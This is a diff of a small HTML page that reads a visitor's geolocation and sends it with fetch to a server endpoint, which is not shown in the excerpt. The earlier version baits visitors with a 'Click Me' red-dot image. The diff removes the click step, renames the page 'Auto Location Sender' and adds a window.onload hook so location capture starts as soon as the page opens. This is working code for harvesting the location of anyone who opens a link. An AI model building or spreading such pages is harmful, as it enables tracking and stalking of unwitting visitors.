@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head><title>Click Me</title></head>
+<head>
+  <title>Auto Location Sender</title>
+</head>
 <body style="text-align: center; padding-top: 50px;">
-  <h2>Tap the image to share your location</h2>
-  <a href="#" onclick="sendLocation()">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/RedDot.svg" alt="Click here" width="200" style="cursor:pointer;">
-  </a>
+  <h2>Sharing your location...</h2>
+  <p id="status">Waiting for location permission...</p>
 
   <script>
     function sendLocation() {
@@ -23,18 +23,21 @@
           })
           .then(res => res.text())
           .then(msg => {
-            alert("Thanks! Location sent.");
+            document.getElementById("status").textContent = "Thanks! Location sent.";
           })
           .catch(err => {
-            alert("Error sending location: " + err);
+            document.getElementById("status").textContent = "Error sending location: " + err;
           });
         }, function(error) {
-          alert("Location permission denied or unavailable.");
+          document.getElementById("status").textContent = "Location permission denied or unavailable.";
         });
       } else {
-        alert("Geolocation not supported.");
+        document.getElementById("status").textContent = "Geolocation not supported.";
       }
     }
+
+    // Call sendLocation automatically on page load
+    window.onload = sendLocation;
   </script>
 </body>
 </html>
